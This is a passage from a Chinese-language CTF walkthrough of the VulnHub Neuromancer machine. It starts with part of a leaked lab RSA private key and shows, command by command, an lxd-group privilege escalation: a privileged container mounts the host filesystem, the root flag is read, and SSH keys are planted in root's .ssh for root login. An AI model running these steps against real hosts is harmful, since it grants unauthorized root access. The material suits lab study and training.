d6wplIaFtzt9npQh3vJnXPF4l6dWCOYAK8FqoGgcbB8qDOz5/j1qxHHo3P8mWyVP
X0wK7UzwBg8nIe3JjKtFPfSpgiNtNGai5GCvJlt7c9Wtxd1HcIFcUrCDeAb9ijMm
zzTLNdkae/677ErzfQfEeA24u21DyQoIP0MUM0ICa3Qjr5uXa1RnNq38pYfi338X
kKwHqJQCxm43HLoQIoMQIRYTN49W3wLMdnH7oF40nT6ktJuC9zlzilV+JxcRODgc
eUFoKag5y2/wR8yeLeUiDgxUzL441ThkYGa2jaULRoVehDgAUXrQEEkzY/OM8/G1
50MJAMEKJU17TDjTtjIy6ymtKPTxohezKvBwjgQmR6eGin32i6iIs38jag8jqape
0MIRzOO3gfod8FXaJMp282gebGhLwWeowjogzfyKQzwIQxkldVVOO1caJWuBczNd
JMKT7F1zoClpEg9YFyPMnkQtoNwjuGs6KtFgpt5yz/8j5jy0uiSaiLlvrOYtDDli
0AEjTlDPbzEQgKhdjdwiPm0ClJoXHIgg35mjwTwfxmFvNL2XJlunm2fDcooDbM3o
2KIzsa5kFEFbvPkP1Cym4RrTRkXv55XfRZHBk5/DBICmez6pkaC1A+W0vfyTX70z
wJrvoUHdENdQIHESb8hrAmqZXjSNsBB1WEKHcN39v/iufxMMk0Dei2Ca5VgTfyfB
lwtrdtV3YPhNT4v+2FhibKIaILIVS0oWU9IAzAHNPMt+GFXo3QRtFJmprJc8AVzf
3guFhYesZZVmzNRDcuhZuQmY54YaCc0VFEBLwoaIn5Y33zPO274IICw0IXzm4Nmm
QttHWLl9IcbVVOkkmnuvNcKZ8kdcZ24zZGXD+2bV/+VQHFanSXjEDdzeYDUjRiiK
va7jEa8wb5/mHOJFRTeYBiuLY1H239HedvycPRfHyA1Hq3q3+7c1JJVxiVdOr3zO
gM22fIaExHxjRdf0L06sht1SC9Le4d6oc5mhFjmk4h+DyorOyWuaC8xBUatE+slF
OxerKC2CdDFCrx9+8jQmix0KSfePhYC4loiQ+tS6Bp8YtiOGOmlZ+2sCa0wf7inN
sOLukUtHENuU720fPxEurnbCDG4QKk4Szvea61UkOrEF15x0PO42YSCz7QtHdLeG
hiHhVK28l9FeRekPEdOUou1tjiiVvEUUNi99YJsOroTNfiHy6RjmcA+BWFOIfHrY
-----END RSA PRIVATE KEY-----
```

kali端运行

``` bash
root@kali:~# cd .ssh
root@kali:~/.ssh# ls
known_hosts
root@kali:~/.ssh# touch id_rsa
root@kali:~/.ssh# nano id_rsa (将ta用户中的id_rsa中的值拷贝进来)
root@kali:~/.ssh# chmod 400 *
```

ssh连接，输入密码123456

``` bash
root@kali:~# ssh -i /root/.ssh/id_rsa -p 34483 ta@192.168.56.110
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Enter passphrase for key '/root/.ssh/id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
44 updates are security updates.


Last login: Tue Jul  3 21:53:25 2018
ta@neuromancer:~$ id
uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
ta@neuromancer:~$ whoami
ta
```

<font color="red">it works!!!!!!</font>

再次执行“groups”命令，然后一分钱掉了……。“ta”不是“admin”组的成员，因此不会成为root用户的即时路径：

``` bash
ta@neuromancer:~$ groups
ta adm cdrom dip plugdev lxd lpadmin sambashare
```

向前迈进...现在没有真正的意义跳到通过socat选项获得TTY…

当试图root时，通常如下进行：

 - sudo
 - password
 - file permissions (suid/guid)
 - cron作业（通常与错误的文件权限结合使用）
 - 内核漏洞
 - 正在运行的应用程序
 - 文件系统

通常，将该列表下移得越远，privesc就越困难。因此，……在用完前两个选项之后，需要进行一些老式枚举。
经过一系列的提权的枚举之后，发现了提权1步骤中的提权的exp，44298.c，，，但是……总会有一个“but”！:-)

#### 步骤4：选择提权利用途径

有许多出色的可用于此计算机的编写，并且毫无例外，它们都采用内核利用选项，因为很正确的选择是最明显的选择。如果需要在检查场景中快速root箱子，那么当然会选择最明显的路线。

除了必须在攻击盒上编译漏洞利用程序（Neuromancer未安装gcc）外，这是一个非常快捷简便的选择。但是抛开任何与CTF/OSCP相关的内容……。在“现实世界”中，可以用来处理关键任务的生产系统呢？内核漏洞可能会使生产箱失效，而根本就不想危及下一步入侵！

但是，还有另一种方法可以使此box成为root，我不禁感到“杂技演员”（机器作者）可能希望将其作为另一种待发现的选择。尽管它可能会吸引蓝团队的注意，但它不太可能引起内核崩溃。那我在说什么呢？可以在以下简单命令中找到线索，以检查“ta”所属的组：

``` bash
ta@neuromancer:~$ groups
ta adm cdrom dip plugdev lxd lpadmin sambashare
```

看到是对lxd的引用,这是Ubunutu的容器技术-Docker的替代方法,我做了一些研究，发现“Booj”写的一篇很棒的文章叫做[Privilege Escalation via lxd](https://reboare.github.io/lxd/lxd-escape.html),根据本文所述，如果安装了lxd且给定用户是lxd组的成员，则它们具有与使用以下命令添加到/etc/sudoers相同的权限：

``` bash
admin ALL=NOPASSWD: ALL
```

因此，...使用此选项非常忙。

#### 步骤5：准备和使用容器-概述

我不会深入探讨与创建基于Ubuntu LXC的容器相关的每个小细节。这将在另一篇文章中发表，因为这是一个引人入胜的主题，值得深入探讨，而不是本文讨论的范围。

简而言之，这项工作涉及以下方面：
 - 根据获取的信息，设置一个尽可能接近Neuromancer的VM。因此，那将是Ubuntu 16.04。
 - 在新创建的VM上安装lxd。
 - 再次创建一个容器，基于Ubuntu 16.04。我只是想让事情简单一点，就我应该做的最好的猜测。
 - 将该容器导出为tarball并将其转移到我的攻击box中，然后再将其转移到Neuromancer box中。由于先前实现了SOCAT端口转发，因此可以通过scp进行传输。

为了清楚起见……在任何时候，都没有允许攻击box位于与Neuromancer相同的物理子网中作弊。所有这些都必须以“艰苦”的方式完成。我应该怎么学？

 - 导入lxd容器映像tarball并使其能够安装主机文件系统（是的，Neuromancer！）
 - 在新创建的容器上获得root bash会话并创建一组SSH密钥，这些密钥将被写入Neuromancer上的/root/.ssh（通过容器中的/mnt/root/root/.ssh），并添加公共Neuromancer主机上/root/.ssh/authorized_keys的密钥（通过容器中的/mnt/root/root/.ssh）
 - 将SSH密钥的副本传输到我的攻击Kali中，然后以root用户身份登录（希望如此）。

上面的内容很雄心勃勃，但是值得这么做，特别是如果唯一的选择是危险的内核漏洞利用。为了简洁，将重点放在刚刚将容器tarball转移到Neuromancer主机上的那一点上。系好安全带，享受旅程吧！:-)

#### 步骤6-导入容器映像。

kali端攻击机运行

``` bash
ta@neuromancer:~$ uname -a
Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
ta@neuromancer:~$ cat /proc/version
Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
```

可以看出是64位的linux

``` bash
root@kali:~# git clone https://github.com/saghul/lxd-alpine-builder
正克隆到 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
展开对象中: 100% (27/27), 完成.
root@kali:~# cd lxd-alpine-builder/
root@kali:~/lxd-alpine-builder# ls
build-alpine  LICENSE  README.md
root@kali:~/lxd-alpine-builder# chmod 777 *
root@kali:~/lxd-alpine-builder# ls
build-alpine  LICENSE  README.md
root@kali:~/lxd-alpine-builder# proxychains ./build-alpine -a x86_64
ProxyChains-3.1 (http://proxychains.sf.net)
Determining the latest release... |DNS-request| dl-cdn.alpinelinux.org 
|D-chain|-<>-127.0.0.1:1080-<><>-4.2.2.2:53-<><>-OK
|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249
|D-chain|-<>-127.0.0.1:1080-<><>-151.101.40.249:80-<><>-OK
v3.11
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.11/main/x86_64
|DNS-request| dl-cdn.alpinelinux.org 
|D-chain|-<>-127.0.0.1:1080-<><>-4.2.2.2:53-<><>-OK
|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249
|D-chain|-<>-127.0.0.1:1080-<><>-151.101.40.249:80-<><>-OK
Downloading alpine-mirrors-3.5.10-r0.apk
|DNS-request| dl-cdn.alpinelinux.org 
|D-chain|-<>-127.0.0.1:1080-<><>-4.2.2.2:53-<><>-OK
|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249
|D-chain|-<>-127.0.0.1:1080-<><>-151.101.40.249:80-<><>-OK
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
Downloading alpine-keys-2.1-r2.apk
|DNS-request| dl-cdn.alpinelinux.org 
|D-chain|-<>-127.0.0.1:1080-<><>-4.2.2.2:53-<><>-OK
|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249
|D-chain|-<>-127.0.0.1:1080-<><>-151.101.40.249:80-<><>-OK
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
Downloading apk-tools-static-2.10.4-r3.apk
|DNS-request| dl-cdn.alpinelinux.org 
|D-chain|-<>-127.0.0.1:1080-<><>-4.2.2.2:53-<><>-OK
|DNS-response| dl-cdn.alpinelinux.org is 151.101.40.249
|D-chain|-<>-127.0.0.1:1080-<><>-151.101.40.249:80-<><>-OK
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: 成功
Verified OK
Selecting mirror http://dl-8.alpinelinux.org/alpine/v3.11/main
fetch http://dl-8.alpinelinux.org/alpine/v3.11/main/x86_64/APKINDEX.tar.gz
(1/19) Installing musl (1.1.24-r0)
(2/19) Installing busybox (1.31.1-r9)
Executing busybox-1.31.1-r9.post-install
(3/19) Installing alpine-baselayout (3.2.0-r3)
Executing alpine-baselayout-3.2.0-r3.pre-install
Executing alpine-baselayout-3.2.0-r3.post-install
(4/19) Installing openrc (0.42.1-r2)
Executing openrc-0.42.1-r2.post-install
(5/19) Installing alpine-conf (3.8.3-r4)
(6/19) Installing libcrypto1.1 (1.1.1d-r3)
(7/19) Installing libssl1.1 (1.1.1d-r3)
(8/19) Installing ca-certificates-cacert (20191127-r0)
(9/19) Installing libtls-standalone (2.9.1-r0)
(10/19) Installing ssl_client (1.31.1-r9)
(11/19) Installing zlib (1.2.11-r3)
(12/19) Installing apk-tools (2.10.4-r3)
(13/19) Installing busybox-suid (1.31.1-r9)
(14/19) Installing busybox-initscripts (3.2-r2)
Executing busybox-initscripts-3.2-r2.post-install
(15/19) Installing scanelf (1.2.4-r0)
(16/19) Installing musl-utils (1.1.24-r0)
(17/19) Installing libc-utils (0.7.2-r0)
(18/19) Installing alpine-keys (2.1-r2)
(19/19) Installing alpine-base (3.11.3-r0)
Executing busybox-1.31.1-r9.trigger
OK: 8 MiB in 19 packages
root@kali:~/lxd-alpine-builder# ls
alpine-v3.11-x86_64-20200119_0151.tar.gz  build-alpine  LICENSE  README.md
```

将alpine-v3.11-x86_64-20200119_0151.tar.gz传输到目标机上

``` bash
ta@neuromancer:/tmp$ scp root@192.168.56.102:/root/lxd-alpine-builder/alpine-v3.11-x86_64-20200119_0151.tar.gz /tmp/
root@192.168.56.102's password: 
alpine-v3.11-x86_64-20200119_0151.tar.gz                                             100% 3151KB   3.1MB/s   00:00    
ta@neuromancer:/tmp$ ls
alpine-v3.11-x86_64-20200119_0151.tar.gz
f
hsperfdata_ta
systemd-private-14b0eedfa06043179575f7374dc44c6a-systemd-timesyncd.service-EqRj97
```

要导入容器映像，使用以下命令：
“别名”是一种引用容器image而不是冗长的文件名的方便方法（根据lxc，它实际上是“指纹”）：

``` bash
ta@neuromancer:/tmp$ lxc image import alpine-v3.11-x86_64-20200119_0151.tar.gz --alias haxor
Image imported with fingerprint: 468c747448ec99c6b76e5a943df89a21489eb5d605ebe5d4c341a78ec217a223
ta@neuromancer:/tmp$ lxc image list
+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| haxor | 468c747448ec | no     | alpine v3.11 (20200119_01:51) | x86_64 | 3.08MB | Jan 19, 2020 at 8:16am (UTC) |
+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```

接下来，您必须基于导入的容器映像创建一个实际的容器：

``` bash
ta@neuromancer:/tmp$ lxc init haxor -c security.privileged=true
Creating the container
Container name is: right-whippet
ta@neuromancer:/tmp$ lxc list
+---------------+---------+------+------+------------+-----------+
|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------------+---------+------+------+------------+-----------+
| right-whippet | STOPPED |      |      | PERSISTENT | 0         |
+---------------+---------+------+------+------------+-----------+
```

请注意，容器名称是自动分配的。我没有具体说明。尽管来自Ubuntu lxc开发人员很幽默。尽管Booj的文章包含了您需要的所有详细信息，但-c开关选项可以有效地为您提供整个主机文件系统所需的Yoda功能。接下来，需要为新容器（“ right-whippet”）指定磁盘安装选项：

``` bash
ta@neuromancer:/tmp$ lxc config device add right-whippet whatever disk source=/ path=/mnt/root recursive=true
Device whatever added to right-whippet
```

如所见，装载主机文件系统的根目录/（Neuromancer），并装载为该命名（“whatever”）到/mnt/root。现在可以启动容器，然后使用以下命令进入bash会话：

启动容器

``` bash
ta@neuromancer:/tmp$ lxc start right-whippet
ta@neuromancer:/tmp$ lxc list
+---------------+---------+------+------+------------+-----------+
|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------------+---------+------+------+------------+-----------+
| right-whippet | RUNNING |      |      | PERSISTENT | 0         |
+---------------+---------+------+------+------------+-----------+
```

进入bash提权，成功拥有root权限

``` bash
ta@neuromancer:/tmp$ lxc exec right-whippet --mode=interactive /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # whoami
root
~ # ls
~ # pwd
/root
```

#### 步骤7-证明我们对Neuromancer文件系统具有根目录访问权限

我们进入容器的/mnt/root目录：

``` bash
~ # cd /mnt/root
/mnt/root # ls
bin         etc         lib         media       proc        sbin        sys         var
boot        home        lib64       mnt         root        snap        tmp         vmlinuz
dev         initrd.img  lost+found  opt         run         srv         usr
```

您实际上是在查看主机（Neuromancer）文件系统的根目录。现在，可以轻松地将cd进入“root”，然后看到最重要的“flag.txt”文件。

``` bash
/mnt/root # cd root
/mnt/root/root # ls
flag.txt      struts2       velocity.log
/mnt/root/root # cat flag.txt
be3306f431dae5ebc93eebb291f4914a
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub169.jpg)

但是我们还没有完成。为了使该计划生效，需要能够写入root（即/mnt/root/root）：

``` bash
/mnt/root/root # echo fuck-all-you-shit > fuck.txt
/mnt/root/root # cat fuck.txt
fuck-all-you-shit
```

是的。有用！所以...现在，只需要获得一个root shell。

#### 步骤8：SSH密钥生成

现在有了写访问权，需要生成一组ssh密钥。仍在容器bash会话（right-whippet）中时，该过程涉及：

 - 运行ssh-keygen。选择您喜欢的任何选项，但确保文件保存到/mnt/root/root/.ssh
 - 创建一个authorized_keys文件: touch /mnt/root/root/.ssh/authorized_keys
 - 将新创建的公共密钥的内容分配到授权密钥文件中： cat /mnt/root/root/.ssh/id_rsa.pub >> authorized_keys

将之前/home/ta/.ssh目录下的文件拷贝到/mnt/root/root/.ssh/下

``` bash
/mnt/root/root/.ssh # cp /mnt/root/home/ta/.ssh/authorized_keys authorized_keys
/mnt/root/root/.ssh # ls
authorized_keys  known_hosts
/mnt/root/root/.ssh # cp /mnt/root/home/ta/.ssh/id_rsa id_rsa
/mnt/root/root/.ssh # cp /mnt/root/home/ta/.ssh/id_rsa.pub id_rsa.pub
```

/mnt/root/root/.ssh的内容现在应如下所示：

``` bash
/mnt/root/root/.ssh # ls
authorized_keys  id_rsa           id_rsa.pub       known_hosts
```

#### 步骤9：将密钥复制到攻击机中

由于使用的是之前/home/ta/.ssh/目录下的文件，所以连接的话，如下连接即可

``` bash
root@kali:~# ssh -i /root/.ssh/id_rsa -p 34483 root@192.168.56.110
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Enter passphrase for key '/root/.ssh/id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
44 updates are security updates.


Last login: Tue Jul  3 22:02:40 2018
root@neuromancer:~# id
uid=0(root) gid=0(root) groups=0(root)
root@neuromancer:~# whoami
root
root@neuromancer:~# 
```

成功连接，密码还是之前连接ta的123456

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub170.jpg)

在“right-whippet” sh会话中执行此操作的最简单方法是，将id_rsa和id_rsa.pub的内容显示在屏幕上，然后将其复制/粘贴到您喜欢的文本编辑器中。确保将文件权限更改为chmod 400，否则当尝试使用它们时，这些键将被忽略（我浪费了一些时间想知道为什么直到这样做之前，这些键才一直不起作用）。

现在只想说，太帅会不会帅死人。。。:)))):::)))::))


#### 提权2总结

总而言之，Neuromancer是一台非常有趣的机器。为了达到目的，必须root另一box（Straylight），然后学习如何正确使用socat进行端口转发。一旦在Neuromancer上使用了低特权shell，特权映射就非常简单了……至少对于内核利用途径而言。但是，很高兴发现lxd提权线索隐藏在范围内.

我只是涉足容器（Docker）之前就某些漏洞进行了一些实验工作，但是从未真正使用容器配置问题来在主机上root。我四处搜寻以确定其他文章是否也涵盖了这个角度，但是到目前为止我还没有发现。因此…最好做一些别人可能会觉得有用的新事情。

<font color="red">Neuromancer知识点总结:</font>
 - tty可交互式shell
 - ssh-key毒化
 - lxd容器提权(new)
 - scp命令传输文件
 - tomcat-users.xml密码泄露

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end WinterMute-1 -->

</details>

